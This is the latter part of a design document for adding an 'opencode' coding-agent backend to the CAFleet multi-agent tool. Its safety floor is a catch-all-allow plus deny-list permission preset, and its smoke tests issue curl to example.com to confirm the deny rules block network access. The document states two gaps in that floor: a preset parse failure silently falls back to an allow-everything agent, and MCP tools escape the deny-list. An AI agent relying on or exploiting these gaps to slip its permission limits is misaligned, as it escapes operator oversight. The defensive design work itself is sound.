| `send_choice_key` | Documented-undefined for opencode placements (TUI permission UI is pre-empted by the catch-all-allow deny-list per § 3.3; Director MUST NOT call it against an opencode placement). | **N/A** |
| `send_exit` (keystrokes `/exit` + Enter) | TUI input box accepts `/exit` as a session-end command. opencode TUI slash-command support is documented at <https://opencode.ai> but not verified in cited source. | **verified-before-merge** |
| `capture_pane` | Multiplexer-level (raw `tmux capture-pane`), independent of the agent rendering. | **verified** |

### Materialization failure modes (§ 4.3)

`OpencodeAgent.ensure_available()` writes `~/.opencode/agents/cafleet.md` on first spawn. The write can fail if `$HOME` is read-only (uncommon on dev workstations), `~/.opencode/` is owned by another user, or the disk is full. `cli.member_create` propagates the resulting `OSError` / `PermissionError` via its existing `RuntimeError` exception path at `cli.py:921-926` and the spawn aborts cleanly with no orphaned placement. Operators see an explicit error and can resolve before retrying.

### Hard-stop rule (user instruction)

If Step 0 empirical verification fails on any **verified-before-merge** primitive AND there is no clean Protocol-respecting workaround inside the current `Multiplexer` surface, the design **stops** and is re-opened with the user. The doc does **not** auto-fall-back to a wrapper-loop (option (a) from clarification) — that path was explicitly rejected. Specifically permitted workaround: per-coding-agent branching inside ONE method (e.g. `tmux.send_inline_preview`) is acceptable as a single-branch concession; broader Protocol changes are not.

The wrapper-loop fallback (`opencode run` one-shot + Python wrapper script) MAY be re-scoped in a follow-on design doc if the user agrees, but not as part of this design.

---

## Out of Scope

- **OS-level sandboxing** (bubblewrap, Landlock, Seatbelt, gvisor, container isolation, seccomp filters). Explicit user instruction. The opencode backend matches Claude Code's `dontAsk` posture — deny-list only.
- **Per-spawn config overrides.** The `CAFLEET_AGENT` preset is static per CAFleet release. Operators who need per-spawn variation can edit `~/.opencode/agents/cafleet.md` directly (CAFleet respects the edit via skip-if-exists) or maintain a fork.
- **Auto-refresh of the preset on CAFleet upgrade.** Skip-if-exists is intentional — user edits survive upgrades, but the trade-off is that upstream preset improvements require manual `rm` + re-spawn. A version-stamp / migration mechanism is out of scope; operators follow the documented refresh recipe in `docs/opencode-members.md`.
- **Wrapper-loop fallback** (`opencode run` one-shot headless mode). Explicitly rejected by the user during clarification. A follow-on design doc may re-scope this if Step 0 verification fails on a no-clean-workaround primitive (per § Risks).
- **opencode version pinning enforcement.** No `opencode --version` check in `OpencodeAgent.ensure_available()`. Matches `ClaudeCodeAgent` and `CodexAgent`. The tested minimum version is documented in `docs/opencode-members.md` only.
- **MCP integration safety.** The doc ships zero MCP stanzas and documents the user-config-leak hole in § Threat Model. A future design may add a per-spawn MCP allow-list mechanism if needed.
- **Pane-title propagation for opencode.** opencode has no `--name` analog. Documented asymmetry, matches codex.
- **Migration of existing `agent_placements` rows.** No schema change. `agent_placements.coding_agent` is free-text `String`; the new value `"opencode"` is accepted without a migration.

---

## Implementation

> Task format: `- [x] Done task <!-- completed: 2026-02-13T14:30 -->`
> When completing a task, check the box and record the timestamp in the same edit.
> Docs-first ordering per `.claude/rules/design-doc-numbering.md`: documentation updates land BEFORE source code. Skill files and `SKILL.md` examples are first-class doc targets — drift between a `SKILL.md` example and the actual CLI is a blocker.

### Step 0: Empirical TUI verification (BEFORE any code lands)

Manually drive `opencode --agent cafleet --prompt "<test-prompt>"` inside a tmux pane. Before launching opencode, write the `CAFLEET_AGENT` preset to `~/.opencode/agents/cafleet.md` by hand (the simplest path is `python -c "from cafleet.coding_agent.opencode_preset import CAFLEET_AGENT, materialize_cafleet_agent; materialize_cafleet_agent(CAFLEET_AGENT)"` once the dataclass module exists; OR draft the markdown file directly during Step 0 prior to Step 2 landing the module). With a sibling shell pane open, exercise each Multiplexer primitive against the opencode TUI pane via raw `tmux send-keys` matching the keystroke shape that `cafleet/src/cafleet/multiplexer/tmux.py` emits. Record observed behavior in a verification note attached to the implementation PR description.

- [x] Install opencode (`opencode --version` reports a version; document the version tested in the PR description) <!-- completed: 2026-05-19 -->
- [x] Verify the bare-`opencode` TUI launches and the `--prompt <prompt>` initial-prompt path actually submits the prompt to the agent (per <https://opencode.ai/docs/cli/>); record any deviation between the docs and the installed binary <!-- completed: 2026-05-19 -->
- [x] **GATE — agent-load + deny-list smoke (BEFORE the primitive sweep).** Materialize `~/.opencode/agents/cafleet.md` by hand (the rendered output of `CAFLEET_AGENT.to_markdown()` from § 3.2, or `python -c "from cafleet.coding_agent.opencode_preset import CAFLEET_AGENT, materialize_cafleet_agent; materialize_cafleet_agent(CAFLEET_AGENT)"` once Step 2 has landed the module). Launch `opencode --agent cafleet --prompt "echo hello"` and trigger a denied operation through the TUI (e.g. type `! curl https://example.com`). Verify opencode reports the deny. If the deny does NOT fire — `config/agent.ts:113-117` silently skips an agent on parse failure (`.catch((err) => { log.error(...); return undefined })`), in which case `--agent cafleet` falls back to opencode's default `build` agent (`agent/agent.ts:127-141`, catch-all-allow) and the safety floor is gone — STOP per the § Risks Hard-stop rule. The spec assumes opencode's `gray-matter` + `js-yaml` parser accepts JSON inside the `---` block as YAML 1.2 flow-style; this gate verifies that assumption end-to-end against the installed binary before any other Step 0 task or any code change <!-- completed: 2026-05-19 -->
- [x] Drive `send_inline_preview` (2-line keystroke: `[cafleet msg <id8> from <id8> <ts>]\n<body>\n`) and record whether opencode submits one prompt or two; record opencode's reaction to the header line <!-- completed: 2026-05-19 -->
- [x] Drive `send_poll_trigger` (verify the existing tmux.py keystroke shape against opencode TUI; document whether opencode's input box has a leading-`!` shortcut or another shell-passthrough mechanism) <!-- completed: 2026-05-19 -->
- [x] Drive `send_bash_command` (keystroke `! ls\n`) and record whether opencode runs the shell command or treats it as a natural-language prompt <!-- completed: 2026-05-19 -->
- [x] Drive `send_freetext_and_submit` (keystroke a multi-word string + Enter) and record whether the TUI submits cleanly <!-- completed: 2026-05-19 -->
- [x] Drive `send_exit` (keystroke `/exit\n`) and record whether opencode terminates the session <!-- completed: 2026-05-19 -->
- [x] If any primitive fails AND a single-branch per-coding-agent concession inside ONE Multiplexer method does NOT solve it, STOP — open a Director-relayed question to the user per § Risks Hard-stop rule. Do NOT proceed to Step 1 <!-- completed: 2026-05-19 -->

### Step 1: Documentation (docs-first per `.claude/rules/design-doc-numbering.md`)

- [x] Update `ARCHITECTURE.md` § Coding Agents: add the `opencode` row to the backend table, update the `coding_agent/` Component Layout description to mention `opencode.py` + `opencode_preset.py`, update the dual-backend prose to three-backend, add a note that the opencode backend's safety floor is the `CAFLEET_AGENT` dataclass preset materialized to `~/.opencode/agents/cafleet.md` on first spawn (matching Claude Code's `dontAsk` posture — NOT Codex's kernel sandbox), reference `docs/opencode-members.md` for operational detail <!-- completed: 2026-05-19T13:30 -->
- [x] Update `ARCHITECTURE.md` § Bash Routing via Director: extend the prose so the leading-`!` shortcut claim covers `claude`, `codex`, AND `opencode` (gated on Step 0 verification of the opencode shortcut) <!-- completed: 2026-05-19T13:30 -->
- [x] Create `docs/opencode-members.md` mirroring `docs/codex-members.md` structure: Overview (bare-`opencode` TUI entry per <https://opencode.ai/docs/cli/>), Spawn flags (`--agent cafleet --prompt <prompt>`; explicitly note no `--interactive` and no `--dangerously-skip-permissions`), "Why we don't pass `--dangerously-skip-permissions`" subsection (the flag is run-only per the CLI docs AND is silently ignored in interactive code paths per the snapshot `run.ts:740-755`, AND the deny-list architecture means nothing resolves to `ask` anyway), "The `cafleet` agent preset" subsection (managed as a frozen dataclass in `cafleet/src/cafleet/coding_agent/opencode_preset.py`, materialized to `~/.opencode/agents/cafleet.md` on first spawn via `OpencodeAgent.ensure_available()`, skip-if-exists so user customization is preserved), "Refreshing the preset after a CAFleet upgrade" subsection (`rm ~/.opencode/agents/cafleet.md` and re-run `cafleet member create --coding-agent opencode`), Required opencode CLI version (the version validated in Step 0), Operating an opencode member, Known asymmetries (no `--name`, `send_choice_key` is undefined for opencode placements), MCP warning (do NOT add MCP servers to any opencode config that opencode loads — none of the deny-list rules cover MCP-contributed tools), CAFleet writes to `$HOME` warning (note that CAFleet writes one file under `~/.opencode/agents/`; no other writes under `$HOME`) <!-- completed: 2026-05-19T13:35 -->
- [x] Update `README.md`: § *Coding agents* prose changes from "two coding agents: `claude` ... and `codex` ..." to "three coding agents: `claude` ... `codex` ... and `opencode` (opencode.ai)". Update the two CLI-table rows at `README.md:163` and `README.md:167` so `[--coding-agent {claude,codex}]` becomes `[--coding-agent {claude,codex,opencode}]` <!-- completed: 2026-05-19T13:37 -->
- [x] Update `docs/spec/cli-options.md`: the two `--coding-agent` flag rows (lines 130 and 340) change their choice enumeration from `claude (default) or codex` to `claude (default), codex, or opencode`. The "currently `["claude", "codex"]`" reminder updates accordingly. Add a single-paragraph note pointing at `docs/opencode-members.md` for opencode operational detail <!-- completed: 2026-05-19T13:40 -->
- [x] Update `docs/spec/cli-options.md` "Spawn command per backend" table (around lines 346-351) — currently two rows (`claude`, `codex`). Add a third row: `opencode | opencode --agent cafleet --prompt <prompt>`. The table-of-record must agree with the actual spawn argv from § Specification 1 <!-- completed: 2026-05-19T13:40 -->
- [x] Update `docs/spec/cli-options.md` `--name` flag row in `member create` (around line 338) — currently notes "The codex backend has no `--name` analog". Extend to: "Neither codex nor opencode has a `--name` analog — operators discover those panes via `cafleet member list`." <!-- completed: 2026-05-19T13:40 -->
- [x] Update `skills/cafleet/SKILL.md` § *Coding-agent backends*: extend the two-backend prose to three-backend, point at `docs/opencode-members.md` for opencode-specific detail. Search for every `claude,codex` literal across `skills/` and update to `claude,codex,opencode` <!-- completed: 2026-05-19T13:45 -->
- [x] Update every other affected skill file: run `grep -rln "claude,codex\|coding-agent.*claude.*codex\|{claude,codex}" skills/ docs/` and update each hit to include `opencode` <!-- completed: 2026-05-19T13:45 -->

### Step 2: Source code — `OpencodeAgentDefinition` dataclass + `CAFLEET_AGENT` preset

- [ ] Create `cafleet/src/cafleet/coding_agent/opencode_preset.py` with `PermissionRuleset` + `OpencodeAgentDefinition` frozen dataclasses per § 3.1, the `to_markdown()` method per § 3.1 (JSON-as-YAML rendering), the `CAFLEET_AGENT` constant per § 3.2, and the `materialize_cafleet_agent(definition)` helper per § 4.2 <!-- completed: -->

### Step 3: Source code — `OpencodeAgent` + registry

- [ ] Update the `CodingAgent.ensure_available` docstring at `cafleet/src/cafleet/coding_agent/base.py:19-21` from the narrow PATH-only contract (`"""Raise RuntimeError if ``binary_name`` is not on PATH."""`) to a broader spawn-precondition contract (e.g. `"""Raise if any spawn precondition is unmet (binary missing, required config file unwritable, etc.). Impls MAY materialize required config files here as a side effect — see ``OpencodeAgent.ensure_available`` for the canonical example."""`). This lands BEFORE the OpencodeAgent impl so the Protocol contract and the impl agree at every commit boundary <!-- completed: -->
- [ ] Create `cafleet/src/cafleet/coding_agent/opencode.py` with the `OpencodeAgent` class from § 1 (imports `CAFLEET_AGENT` + `materialize_cafleet_agent` from `opencode_preset`; `ensure_available` calls both `ensure_binary_on_path` and `materialize_cafleet_agent(CAFLEET_AGENT)`) <!-- completed: -->
- [ ] Update `cafleet/src/cafleet/coding_agent/__init__.py` per § 2: import `OpencodeAgent`, add `"opencode": OpencodeAgent()` to `CODING_AGENTS`, add `"OpencodeAgent"` to `__all__` <!-- completed: -->

### Step 4: Source code — `cli.py` integration (no changes required)

- [ ] Verify no `cli.member_create` change is required per § 4.4 — `agent.ensure_available()` at `cli.py:923` already covers the materialization side effect; the existing `fwd_env` continues to carry only `CAFLEET_DATABASE_URL` <!-- completed: -->
- [ ] Verify no `cli.session_create` change is required per § 4.4 — `--coding-agent opencode` on `session create` is metadata only; manual operator-side `opencode --agent cafleet --prompt <prompt>` invocations are addressed in `docs/opencode-members.md` <!-- completed: -->

### Step 5: Tests

- [ ] Add `tests/test_coding_agent_protocol.py` parametrization confirms `OpencodeAgent` registers and `isinstance(OpencodeAgent(), CodingAgent)` holds. Since the test is already parametrized over `CODING_AGENTS.values()` per design 0000066, this should be automatic — verify the test grows from 2 cases to 3 with no test code change <!-- completed: -->
- [ ] Add unit tests for `OpencodeAgent.build_spawn_argv`: verifies argv shape is exactly `["opencode", "--agent", "cafleet", "--prompt", <prompt>]` and explicitly asserts the argv does NOT contain `"run"`, `"--interactive"`, or `"--dangerously-skip-permissions"` (regression guard against accidentally re-adding the dropped flags); verifies `display_name` is ignored; verifies the prompt is passed as the value of `--prompt`, not as a positional <!-- completed: -->
- [ ] Add unit tests for `CAFLEET_AGENT.to_markdown()` — parse the rendered output (split on `---` delimiters, JSON-decode the frontmatter), assert structural invariants: `mode == "primary"`, `permission.bash` has `"*": "allow"` as its FIRST key, every dangerous wrapper pattern from § 3.2 is present with `"deny"`, every Action-shorthand key resolves to `"deny"`. This is the regression guard against accidental edits that would break last-match-wins ordering or drop a pattern <!-- completed: -->
- [ ] Add unit tests for `materialize_cafleet_agent` using `tmp_path` + monkeypatched `os.path.expanduser`: (a) when the target does NOT exist, the file is written with `CAFLEET_AGENT.to_markdown()` content and parent dirs are created; (b) when the target DOES exist with arbitrary content, calling materialize is a no-op (file content unchanged); (c) `OpencodeAgent().ensure_available()` invokes `materialize_cafleet_agent(CAFLEET_AGENT)` exactly once via monkeypatched spy <!-- completed: -->
- [ ] Add an integration test that round-trips the rendered markdown through a YAML parser (PyYAML if available as a test-only dep, or a JSON parse since JSON is a valid YAML subset) to confirm opencode-compatible parseability. If PyYAML is not desired as a test dep, the JSON-parse path is sufficient since `to_markdown()` emits JSON-shaped frontmatter <!-- completed: -->

### Step 6: Verification

- [ ] Run `mise //cafleet:lint`, `mise //cafleet:format`, `mise //cafleet:typecheck`, `mise //cafleet:test` — all green <!-- completed: -->
- [ ] Run `mise //cafleet:install` to reinstall the editable tool <!-- completed: -->
- [ ] Manually delete `~/.opencode/agents/cafleet.md` if it exists, then from a tmux session run `cafleet session create --label test-opencode --coding-agent opencode` and `cafleet --session-id <s> member create --agent-id <root-director> --name OpencodeA --description "smoke test" --coding-agent opencode -- "say hello"`. Verify `~/.opencode/agents/cafleet.md` is materialized (`cat` it and check the JSON frontmatter contains the catch-all-allow + specific-deny patterns), the spawned pane runs `opencode --agent cafleet --prompt "say hello"`, shows a long-lived TUI, and the CAFleet config is honored (e.g. by asking opencode to `curl example.com` and verifying the deny-list blocks it) <!-- completed: -->
- [ ] Run the same `member create` invocation a second time with the preset file in place; verify the file is NOT modified (capture `stat` mtime before / after) — confirming the skip-if-exists semantics <!-- completed: -->
- [ ] Smoke test the bash-via-Director protocol: from the Director pane, `cafleet --session-id <s> member exec --agent-id <director> --member-id <opencode-member> "ls -la"` — verify the command runs and output lands in the member's pane (gated on Step 0 verification of opencode's leading-`!` shortcut) <!-- completed: -->
- [ ] Smoke test `cafleet member delete --member-id <opencode-member>` — verifies `/exit` is honored by the opencode TUI and the pane disappears within the 15 s timeout (gated on Step 0 verification of `/exit`) <!-- completed: -->

---

## Changelog

| Date | Changes |
|------|---------|
| 2026-05-19 | Initial draft. Spec committed to `opencode run --interactive --dangerously-skip-permissions --agent cafleet` (option (b) interactive TUI). Package-data config at `cafleet/src/cafleet/coding_agent/opencode_config/` forwarded via `OPENCODE_CONFIG_DIR` from `cli.member_create`. Catch-all-allow + specific-deny `opencode.json` + `agent/cafleet.md` pre-empt the `ask` state in the interactive TUI. Step 0 empirical verification of TUI keystroke primitives is mandatory before any code lands; hard-stop rule per user instruction. |
| 2026-05-19 | Spawn argv revised to bare `opencode --agent cafleet --prompt <prompt>` after user cited <https://opencode.ai/docs/cli/>. Dropped `run` subcommand (the docs flag it as the headless / scripting entry, not the TUI entry — the bare command IS the TUI entry). Dropped `--interactive` (not in public docs; internal snapshot flag). Dropped `--dangerously-skip-permissions` (docs list it under `opencode run` only AND it is silently ignored in interactive code paths in the snapshot — both reasons converge to "do not pass"). Initial prompt now passed via `--prompt` flag, not as a positional, because bare `opencode` takes `[project]` as its positional (not `[message..]`). Added Background § *Source-citation methodology* footnote noting the `reference/opencode/` snapshot is older than the version backing the public docs. Deny-list architecture and all other revisions unchanged. |
| 2026-05-19 | Config plumbing redesigned per user request. Replaced the package-data `opencode_config/` dir + `OPENCODE_CONFIG_DIR` env-var forwarding with a dataclass-backed runtime materialization: `OpencodeAgentDefinition` + `CAFLEET_AGENT` preset live in `cafleet/src/cafleet/coding_agent/opencode_preset.py`; `OpencodeAgent.ensure_available()` calls `materialize_cafleet_agent(CAFLEET_AGENT)` which writes the rendered markdown to `~/.opencode/agents/cafleet.md` with skip-if-exists semantics (respecting user customization). Dropped the global `opencode.json` (redundant once the agent definition is the load-bearing safety floor — opencode's built-in `defaults` already deny `question`/`plan_enter`/`plan_exit`, and our agent re-statement wins via `findLast` merge precedence). Dropped all `cli.member_create` / `cli.session_create` plumbing changes (`fwd_env` continues to carry only `CAFLEET_DATABASE_URL`; no `OPENCODE_CONFIG_DIR` forwarding). Dropped the `pyproject.toml` package-data include. Added Threat Model rows for the new `$HOME` write footprint and the skip-if-exists upgrade-staleness trade-off. Added Out of Scope item for auto-refresh on upgrade. |
| 2026-05-19 | Step 0 empirical verification completed against the installed `opencode` binary per operator attestation: agent-load + deny-list smoke passed, and every keystroke primitive (`send_inline_preview`, `send_poll_trigger`, `send_bash_command`, `send_freetext_and_submit`, `send_exit`) was driven against the bare-`opencode` TUI with acceptable behavior. All Step 0 checkboxes marked complete. Verification notes will be attached to the implementation PR description. |
